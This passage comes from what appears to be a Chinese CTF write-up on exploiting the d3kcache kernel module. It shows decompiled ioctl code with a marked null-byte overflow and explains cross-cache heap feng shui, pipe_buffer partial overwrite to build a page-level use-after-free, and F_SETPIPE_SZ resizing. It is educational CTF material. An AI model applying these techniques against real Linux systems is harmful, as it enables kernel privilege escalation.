<span class=w>  </span><span class=kt>unsigned</span><span class=w> </span><span class=kr>__int64</span><span class=w> </span><span class=n>v24</span><span class=p>;</span><span class=w> </span><span class=c1>// rbx</span>
<span class=w>  </span><span class=kt>void</span><span class=w> </span><span class=o>*</span><span class=n>v25</span><span class=p>;</span><span class=w> </span><span class=c1>// rdi</span>
<span class=w>  </span><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>v26</span><span class=p>;</span><span class=w> </span><span class=c1>// [rsp+0h] [rbp-40h] BYREF</span>
<span class=w>  </span><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>v27</span><span class=p>;</span><span class=w> </span><span class=c1>// [rsp+4h] [rbp-3Ch]</span>
<span class=w>  </span><span class=kr>__int64</span><span class=w> </span><span class=n>v28</span><span class=p>;</span><span class=w> </span><span class=c1>// [rsp+8h] [rbp-38h]</span>
<span class=w>  </span><span class=kt>unsigned</span><span class=w> </span><span class=kr>__int64</span><span class=w> </span><span class=n>v29</span><span class=p>;</span><span class=w> </span><span class=c1>// [rsp+10h] [rbp-30h]</span>

<span class=w>  </span><span class=n>v29</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>__readgsqword</span><span class=p>(</span><span class=mh>0x28u</span><span class=p>);</span>
<span class=w>  </span><span class=n>raw_spin_lock</span><span class=p>(</span><span class=o>&amp;</span><span class=n>spin</span><span class=p>);</span>
<span class=w>  </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>copy_from_user</span><span class=p>(</span><span class=o>&amp;</span><span class=n>v26</span><span class=p>,</span><span class=w> </span><span class=n>a3</span><span class=p>,</span><span class=w> </span><span class=mf>16L</span><span class=n>L</span><span class=p>)</span><span class=w> </span><span class=p>)</span>
<span class=w>    </span><span class=k>goto</span><span class=w> </span><span class=n>LABEL_2</span><span class=p>;</span>
<span class=w>  </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>a2</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=mi>2063</span><span class=w> </span><span class=p>)</span>
<span class=w>  </span><span class=p>{</span>
<span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>a2</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>2064</span><span class=w> </span><span class=p>)</span>
<span class=w>    </span><span class=p>{</span>
<span class=w>      </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>v26</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=mh>0xFuLL</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=o>!</span><span class=n>qword_17D8</span><span class=p>[</span><span class=mi>2</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>v26</span><span class=p>]</span><span class=w> </span><span class=p>)</span>
<span class=w>      </span><span class=p>{</span>
<span class=w>        </span><span class=n>v25</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>&amp;</span><span class=n>unk_882</span><span class=p>;</span>
<span class=w>        </span><span class=k>goto</span><span class=w> </span><span class=n>LABEL_46</span><span class=p>;</span>
<span class=w>      </span><span class=p>}</span>
<span class=w>      </span><span class=n>kmem_cache_free</span><span class=p>(</span><span class=n>kcache_jar</span><span class=p>);</span>
<span class=w>      </span><span class=n>v20</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=p>)</span><span class=n>v26</span><span class=p>;</span>
<span class=w>      </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=p>(</span><span class=kt>unsigned</span><span class=w> </span><span class=kr>__int64</span><span class=p>)(</span><span class=kt>int</span><span class=p>)</span><span class=n>v26</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=mh>0xF</span><span class=w> </span><span class=p>)</span>
<span class=w>      </span><span class=p>{</span>
<span class=w>        </span><span class=n>_ubsan_handle_out_of_bounds</span><span class=p>(</span><span class=o>&amp;</span><span class=n>off_12A0</span><span class=p>,</span><span class=w> </span><span class=n>v26</span><span class=p>);</span>
<span class=w>        </span><span class=n>v21</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=p>)</span><span class=n>v26</span><span class=p>;</span>
<span class=w>        </span><span class=n>qword_17D8</span><span class=p>[</span><span class=mi>2</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>v20</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mf>0L</span><span class=n>L</span><span class=p>;</span>
<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>v21</span><span class=w> </span><span class=o>&gt;=</span><span class=w> </span><span class=mh>0x10</span><span class=w> </span><span class=p>)</span>
<span class=w>          </span><span class=n>_ubsan_handle_out_of_bounds</span><span class=p>(</span><span class=o>&amp;</span><span class=n>off_12C0</span><span class=p>,</span><span class=w> </span><span class=p>(</span><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=p>)</span><span class=n>v21</span><span class=p>);</span>
<span class=w>      </span><span class=p>}</span>
<span class=w>      </span><span class=k>else</span>
<span class=w>      </span><span class=p>{</span>
<span class=w>        </span><span class=n>qword_17D8</span><span class=p>[</span><span class=mi>2</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=p>)</span><span class=n>v26</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mf>0L</span><span class=n>L</span><span class=p>;</span>
<span class=w>        </span><span class=n>v21</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=p>)</span><span class=n>v20</span><span class=p>;</span>
<span class=w>      </span><span class=p>}</span>
<span class=w>      </span><span class=n>kcache_list</span><span class=p>[</span><span class=mi>4</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>v21</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
<span class=w>    </span><span class=p>}</span>
<span class=w>    </span><span class=k>else</span>
<span class=w>    </span><span class=p>{</span>
<span class=w>      </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>a2</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=mi>6425</span><span class=w> </span><span class=p>)</span>
<span class=w>        </span><span class=k>goto</span><span class=w> </span><span class=n>LABEL_42</span><span class=p>;</span>
<span class=w>      </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>v26</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=mh>0xFuLL</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=o>!</span><span class=n>qword_17D8</span><span class=p>[</span><span class=mi>2</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>v26</span><span class=p>]</span><span class=w> </span><span class=p>)</span>
<span class=w>      </span><span class=p>{</span>
<span class=w>        </span><span class=n>v25</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>&amp;</span><span class=n>unk_85D</span><span class=p>;</span>
<span class=w>        </span><span class=k>goto</span><span class=w> </span><span class=n>LABEL_46</span><span class=p>;</span>
<span class=w>      </span><span class=p>}</span>
<span class=w>      </span><span class=n>v11</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>v27</span><span class=p>;</span>
<span class=w>      </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>v27</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=n>kcache_list</span><span class=p>[</span><span class=mi>4</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>v26</span><span class=p>]</span><span class=w> </span><span class=p>)</span>
<span class=w>        </span><span class=n>v11</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>kcache_list</span><span class=p>[</span><span class=mi>4</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>v26</span><span class=p>];</span>
<span class=w>      </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>v11</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mi>0</span><span class=w> </span><span class=p>)</span>
<span class=w>        </span><span class=n>BUG</span><span class=p>();</span>
<span class=w>      </span><span class=n>v12</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=p>)</span><span class=n>v11</span><span class=p>;</span>
<span class=w>      </span><span class=n>v13</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>qword_17D8</span><span class=p>[</span><span class=mi>2</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>v26</span><span class=p>];</span>
<span class=w>      </span><span class=n>v14</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>v28</span><span class=p>;</span>
<span class=w>      </span><span class=n>_check_object_size</span><span class=p>(</span><span class=n>v13</span><span class=p>,</span><span class=w> </span><span class=p>(</span><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=p>)</span><span class=n>v11</span><span class=p>,</span><span class=w> </span><span class=mf>1L</span><span class=n>L</span><span class=p>);</span>
<span class=w>      </span><span class=n>copy_to_user</span><span class=p>(</span><span class=n>v14</span><span class=p>,</span><span class=w> </span><span class=n>v13</span><span class=p>,</span><span class=w> </span><span class=n>v12</span><span class=p>);</span>
<span class=w>    </span><span class=p>}</span>
<span class=w>  </span><span class=p>}</span>
<span class=w>  </span><span class=k>else</span>
<span class=w>  </span><span class=p>{</span>
<span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>a2</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=mi>276</span><span class=w> </span><span class=p>)</span>
<span class=w>    </span><span class=p>{</span>
<span class=w>      </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>a2</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>1300</span><span class=w> </span><span class=p>)</span>
<span class=w>      </span><span class=p>{</span>
<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>v26</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=mh>0xFuLL</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=n>qword_17D8</span><span class=p>[</span><span class=mi>2</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>v26</span><span class=p>]</span><span class=w> </span><span class=p>)</span>
<span class=w>        </span><span class=p>{</span>
<span class=w>          </span><span class=n>v7</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>v27</span><span class=p>;</span>
<span class=w>          </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>v27</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=mh>0x800</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=n>v27</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>kcache_list</span><span class=p>[</span><span class=mi>4</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>v26</span><span class=p>]</span><span class=w> </span><span class=o>&gt;=</span><span class=w> </span><span class=mh>0x800</span><span class=w> </span><span class=p>)</span>
<span class=w>            </span><span class=n>v7</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>2048</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=n>kcache_list</span><span class=p>[</span><span class=mi>4</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>v26</span><span class=p>];</span>
<span class=w>          </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>v7</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mi>0</span><span class=w> </span><span class=p>)</span>
<span class=w>            </span><span class=n>BUG</span><span class=p>();</span>
<span class=w>          </span><span class=n>v8</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>qword_17D8</span><span class=p>[</span><span class=mi>2</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>v26</span><span class=p>]</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=p>(</span><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=p>)</span><span class=n>kcache_list</span><span class=p>[</span><span class=mi>4</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>v26</span><span class=p>];</span>
<span class=w>          </span><span class=n>v9</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=p>)</span><span class=n>v7</span><span class=p>;</span>
<span class=w>          </span><span class=n>v10</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>v28</span><span class=p>;</span>
<span class=w>          </span><span class=n>_check_object_size</span><span class=p>(</span><span class=n>v8</span><span class=p>,</span><span class=w> </span><span class=p>(</span><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=p>)</span><span class=n>v7</span><span class=p>,</span><span class=w> </span><span class=mf>0L</span><span class=n>L</span><span class=p>);</span>
<span class=w>          </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=o>!</span><span class=n>copy_from_user</span><span class=p>(</span><span class=n>v8</span><span class=p>,</span><span class=w> </span><span class=n>v10</span><span class=p>,</span><span class=w> </span><span class=n>v9</span><span class=p>)</span><span class=w> </span><span class=p>)</span>
<span class=w>            </span><span class=o>*</span><span class=p>(</span><span class=n>_BYTE</span><span class=w> </span><span class=o>*</span><span class=p>)(</span><span class=n>v8</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>v9</span><span class=p>)</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=cm>/* vulnerability here */</span>
<span class=w>          </span><span class=k>goto</span><span class=w> </span><span class=n>LABEL_2</span><span class=p>;</span>
<span class=w>        </span><span class=p>}</span>
<span class=w>        </span><span class=n>v25</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>&amp;</span><span class=n>unk_837</span><span class=p>;</span>
<span class=nl>LABEL_46</span><span class=p>:</span>
<span class=w>        </span><span class=n>printk</span><span class=p>(</span><span class=n>v25</span><span class=p>);</span>
<span class=w>        </span><span class=k>goto</span><span class=w> </span><span class=n>LABEL_2</span><span class=p>;</span>
<span class=w>      </span><span class=p>}</span>
<span class=nl>LABEL_42</span><span class=p>:</span>
<span class=w>      </span><span class=n>v25</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>&amp;</span><span class=n>unk_8AA</span><span class=p>;</span>
<span class=w>      </span><span class=k>goto</span><span class=w> </span><span class=n>LABEL_46</span><span class=p>;</span>
<span class=w>    </span><span class=p>}</span>
<span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>v26</span><span class=w> </span><span class=o>&gt;=</span><span class=w> </span><span class=mh>0x10uLL</span><span class=w> </span><span class=p>)</span>
<span class=w>    </span><span class=p>{</span>
<span class=w>      </span><span class=n>v25</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>&amp;</span><span class=n>unk_782</span><span class=p>;</span>
<span class=w>      </span><span class=k>goto</span><span class=w> </span><span class=n>LABEL_46</span><span class=p>;</span>
<span class=w>    </span><span class=p>}</span>
<span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>qword_17D8</span><span class=p>[</span><span class=mi>2</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>v26</span><span class=p>]</span><span class=w> </span><span class=p>)</span>
<span class=w>    </span><span class=p>{</span>
<span class=w>      </span><span class=n>v25</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>&amp;</span><span class=n>unk_7F6</span><span class=p>;</span>
<span class=w>      </span><span class=k>goto</span><span class=w> </span><span class=n>LABEL_46</span><span class=p>;</span>
<span class=w>    </span><span class=p>}</span>
<span class=w>    </span><span class=n>v15</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>kmem_cache_alloc</span><span class=p>(</span><span class=n>kcache_jar</span><span class=p>,</span><span class=w> </span><span class=mf>3520L</span><span class=n>L</span><span class=p>);</span>
<span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=o>!</span><span class=n>v15</span><span class=w> </span><span class=p>)</span>
<span class=w>    </span><span class=p>{</span>
<span class=w>      </span><span class=n>v25</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>&amp;</span><span class=n>unk_81A</span><span class=p>;</span>
<span class=w>      </span><span class=k>goto</span><span class=w> </span><span class=n>LABEL_46</span><span class=p>;</span>
<span class=w>    </span><span class=p>}</span>
<span class=w>    </span><span class=n>v16</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>v15</span><span class=p>;</span>
<span class=w>    </span><span class=n>v17</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>v27</span><span class=p>;</span>
<span class=w>    </span><span class=n>v18</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mf>2048L</span><span class=n>L</span><span class=p>;</span>
<span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>v27</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mh>0x800</span><span class=w> </span><span class=p>)</span>
<span class=w>      </span><span class=n>v18</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>v27</span><span class=p>;</span>
<span class=w>    </span><span class=n>v19</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>v28</span><span class=p>;</span>
<span class=w>    </span><span class=n>_check_object_size</span><span class=p>(</span><span class=n>v15</span><span class=p>,</span><span class=w> </span><span class=n>v18</span><span class=p>,</span><span class=w> </span><span class=mf>0L</span><span class=n>L</span><span class=p>);</span>
<span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>copy_from_user</span><span class=p>(</span><span class=n>v16</span><span class=p>,</span><span class=w> </span><span class=n>v19</span><span class=p>,</span><span class=w> </span><span class=n>v18</span><span class=p>)</span><span class=w> </span><span class=p>)</span>
<span class=w>    </span><span class=p>{</span>
<span class=w>      </span><span class=n>kmem_cache_free</span><span class=p>(</span><span class=n>kcache_jar</span><span class=p>);</span>
<span class=w>    </span><span class=p>}</span>
<span class=w>    </span><span class=k>else</span>
<span class=w>    </span><span class=p>{</span>
<span class=w>      </span><span class=n>v22</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mf>2047L</span><span class=n>L</span><span class=p>;</span>
<span class=w>      </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>v17</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mh>0x7FF</span><span class=w> </span><span class=p>)</span>
<span class=w>        </span><span class=n>v22</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>v17</span><span class=p>;</span>
<span class=w>      </span><span class=o>*</span><span class=p>(</span><span class=n>_BYTE</span><span class=w> </span><span class=o>*</span><span class=p>)(</span><span class=n>v16</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>v22</span><span class=p>)</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
<span class=w>      </span><span class=n>v23</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=p>)</span><span class=n>v26</span><span class=p>;</span>
<span class=w>      </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=p>(</span><span class=kt>unsigned</span><span class=w> </span><span class=kr>__int64</span><span class=p>)(</span><span class=kt>int</span><span class=p>)</span><span class=n>v26</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=mh>0xF</span><span class=w> </span><span class=p>)</span>
<span class=w>      </span><span class=p>{</span>
<span class=w>        </span><span class=n>_ubsan_handle_out_of_bounds</span><span class=p>(</span><span class=o>&amp;</span><span class=n>off_1260</span><span class=p>,</span><span class=w> </span><span class=n>v26</span><span class=p>);</span>
<span class=w>        </span><span class=n>v24</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=p>)</span><span class=n>v26</span><span class=p>;</span>
<span class=w>        </span><span class=n>qword_17D8</span><span class=p>[</span><span class=mi>2</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>v23</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>v16</span><span class=p>;</span>
<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>v24</span><span class=w> </span><span class=o>&gt;=</span><span class=w> </span><span class=mh>0x10</span><span class=w> </span><span class=p>)</span>
<span class=w>          </span><span class=n>_ubsan_handle_out_of_bounds</span><span class=p>(</span><span class=o>&amp;</span><span class=n>off_1280</span><span class=p>,</span><span class=w> </span><span class=p>(</span><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=p>)</span><span class=n>v24</span><span class=p>);</span>
<span class=w>      </span><span class=p>}</span>
<span class=w>      </span><span class=k>else</span>
<span class=w>      </span><span class=p>{</span>
<span class=w>        </span><span class=n>qword_17D8</span><span class=p>[</span><span class=mi>2</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=p>)</span><span class=n>v26</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>v16</span><span class=p>;</span>
<span class=w>        </span><span class=n>v24</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=p>)</span><span class=n>v23</span><span class=p>;</span>
<span class=w>      </span><span class=p>}</span>
<span class=w>      </span><span class=n>kcache_list</span><span class=p>[</span><span class=mi>4</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>v24</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>v18</span><span class=p>;</span>
<span class=w>    </span><span class=p>}</span>
<span class=w>  </span><span class=p>}</span>
<span class=nl>LABEL_2</span><span class=p>:</span>
<span class=w>  </span><span class=n>raw_spin_unlock</span><span class=p>(</span><span class=o>&amp;</span><span class=n>spin</span><span class=p>);</span>
<span class=w>  </span><span class=k>return</span><span class=w> </span><span class=n>_x86_return_thunk</span><span class=p>(</span><span class=mf>0L</span><span class=n>L</span><span class=p>,</span><span class=w> </span><span class=mf>0L</span><span class=n>L</span><span class=p>,</span><span class=w> </span><span class=mf>0L</span><span class=n>L</span><span class=p>,</span><span class=w> </span><span class=mf>0L</span><span class=n>L</span><span class=p>,</span><span class=w> </span><span class=n>v4</span><span class=p>,</span><span class=w> </span><span class=n>v5</span><span class=p>);</span>
<span class=p>}</span>
</code></pre></div> <p>同时查看题目所提供的内核编译文件，可以发现<strong>开启了 Control Flow Integrity 保护</strong>：</p> <div class=highlight><pre><span></span><code>CONFIG_CFI_CLANG=y
</code></pre></div> <p>其他的各种常规保护（KPTI、KASLR、Hardened Usercopy、...）基本上都是开启的，这里就不阐述了。</p> <blockquote> <p>当然，在内核漏洞利用蓬勃发展的今日，现在做内核漏洞利用自然要默认这些保护都开了。</p> </blockquote> <h3 id=_2>漏洞利用<a class=headerlink href=#_2 title="Permanent link">&para;</a></h3> <p>由于题目所在的 <code>kmem_cache</code> 为一个独立的 <code>kmem_cache</code> ，因此我们只能考虑 <strong>cross-cache overflow</strong>：<strong>溢出到其他结构体所在页面上完成利用</strong>。</p> <blockquote> <p>毕竟我们很难指望在 freelist 相关保护都开启的情况下 free object 的 next 指针刚好在前 8 字节然后覆写又刚好能把 freelist 劫持到有效可控地址上。</p> </blockquote> <h4 id=stepi->Step.I - 页级堆风水构造稳定跨页溢出布局<a class=headerlink href=#stepi- title="Permanent link">&para;</a></h4> <blockquote> <p>页级堆风水的实现细节在上一章中已有讲述，这里不再赘叙。</p> </blockquote> <p>为了保证溢出的稳定性，这里笔者使用页级堆风水的方法来构造<strong>预溢出布局</strong>，通过页级堆风水获得<strong>对一块连续内存的页级掌控</strong>，从而可以这样构造出如下图所示堆布局：</p> <ul> <li>先释放一部分页面，让 victim object 取得这些页面</li> <li>释放一份页面，向题目模块请求分配对象，从而获得该份页面</li> <li>再释放一部分页面，让 victim object 取得这些页面</li> </ul> <p>这样题目所在的页面便会被夹在 victim 对象的页面中间，使得<strong>溢出的稳定性大幅增加</strong>。</p> <p><img alt src=../figure/d3kcache-cross-cache-overflow.png></p> <h4 id=stepii-fcntlf_setpipe_sz-pipe_buffer-slub-uaf>Step.II - fcntl(F_SETPIPE_SZ) 更改 pipe_buffer 所在 slub 大小，跨页溢出构造页级 UAF<a class=headerlink href=#stepii-fcntlf_setpipe_sz-pipe_buffer-slub-uaf title="Permanent link">&para;</a></h4> <p>接下来我们考虑溢出的目标对象，由于仅有一个字节的溢出，毫无疑问的是我们需要寻找一些在结构体头部便有指向其他内核对象的指针的内核对象，我们不难想到的是 <code>pipe_buffer</code> 是一个非常好的的利用对象，其开头有着指向 <code>page</code> 结构体的指针，而 <code>page</code> 的大小仅为 <code>0x40</code> ，可以被 0x100 整除，若我们能够<strong>通过 partial overwrite 使得两个管道指向同一张页面，并释放掉其中一个</strong>，我们便构造出了<strong>页级的 UAF</strong>：</p> <p><img alt="original state" src=../figure/d3kcache-original.png></p> <p><img alt="null-byte partial overwrite" src=../figure/d3kcache-overflow.png></p> <p><img alt="page-level UAF" src=../figure/d3kcache-page-uaf.png></p> <p>同时<strong>管道的特性还能让我们在 UAF 页面上任意读写</strong>，这使得我们可以<strong>将该 page 分配为其他 kmem_cache 的 slub pages 后，利用管道对上面的对象实现任意读写</strong>。</p> <p>但是有一个小问题，<code>pipe_buffer</code> 来自于 <code>kmalloc-cg-1k</code> ，其会请求 order-2 的页面，而题目模块的对象大小为 2k，其会请求 order-3 的页面，如果我们直接进行不同 order 间的堆风水的话，则利用成功率会大打折扣 。</p> <p>现在让我们重新审视 <code>pipe_buffer</code> 的分配过程，其实际上是单次分配 <code>pipe_bufs</code> 个 <code>pipe_buffer</code> 结构体：</p> <div class=highlight><pre><span></span><code><span class=k>struct</span><span class=w> </span><span class=nc>pipe_inode_info</span><span class=w> </span><span class=o>*</span><span class=n>alloc_pipe_info</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>    </span><span class=c1>//...</span>

<span class=w>    </span><span class=n>pipe</span><span class=o>-&gt;</span><span class=n>bufs</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>kcalloc</span><span class=p>(</span><span class=n>pipe_bufs</span><span class=p>,</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=k>struct</span><span class=w> </span><span class=nc>pipe_buffer</span><span class=p>),</span>
<span class=w>                 </span><span class=n>GFP_KERNEL_ACCOUNT</span><span class=p>);</span>
</code></pre></div> <p>这里注意到 <code>pipe_buffer</code> <strong>不是一个常量而是一个变量</strong>，那么<strong>我们能否有方法修改 pipe_buffer 的数量？</strong>答案是肯定的，pipe 系统调用非常贴心地为我们提供了 <code>F_SETPIPE_SZ</code> <strong>让我们可以重新分配 pipe_buffer 并指定其数量</strong>：</p> <div class=highlight><pre><span></span><code><span class=kt>long</span><span class=w> </span><span class=nf>pipe_fcntl</span><span class=p>(</span><span class=k>struct</span><span class=w> </span><span class=nc>file</span><span class=w> </span><span class=o>*</span><span class=n>file</span><span class=p>,</span><span class=w> </span><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>cmd</span><span class=p>,</span><span class=w> </span><span class=kt>unsigned</span><span class=w> </span><span class=kt>long</span><span class=w> </span><span class=n>arg</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>    </span><span class=k>struct</span><span class=w> </span><span class=nc>pipe_inode_info</span><span class=w> </span><span class=o>*</span><span class=n>pipe</span><span class=p>;</span>
<span class=w>    </span><span class=kt>long</span><span class=w> </span><span class=n>ret</span><span class=p>;</span>

<span class=w>    </span><span class=n>pipe</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>get_pipe_info</span><span class=p>(</span><span class=n>file</span><span class=p>,</span><span class=w> </span><span class=nb>false</span><span class=p>);</span>
<span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>pipe</span><span class=p>)</span>
<span class=w>        </span><span class=k>return</span><span class=w> </span><span class=o>-</span><span class=n>EBADF</span><span class=p>;</span>

<span class=w>    </span><span class=n>__pipe_lock</span><span class=p>(</span><span class=n>pipe</span><span class=p>);</span>

<span class=w>    </span><span class=k>switch</span><span class=w> </span><span class=p>(</span><span class=n>cmd</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>    </span><span class=k>case</span><span class=w> </span><span class=no>F_SETPIPE_SZ</span><span class=p>:</span>
<span class=w>        </span><span class=n>ret</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>pipe_set_size</span><span class=p>(</span><span class=n>pipe</span><span class=p>,</span><span class=w> </span><span class=n>arg</span><span class=p>);</span>
<span class=c1>//...</span>

<span class=k>static</span><span class=w> </span><span class=kt>long</span><span class=w> </span><span class=n>pipe_set_size</span><span class=p>(</span><span class=k>struct</span><span class=w> </span><span class=nc>pipe_inode_info</span><span class=w> </span><span class=o>*</span><span class=n>pipe</span><span class=p>,</span><span class=w> </span><span class=kt>unsigned</span><span class=w> </span><span class=kt>long</span><span class=w> </span><span class=n>arg</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>    </span><span class=c1>//...</span>

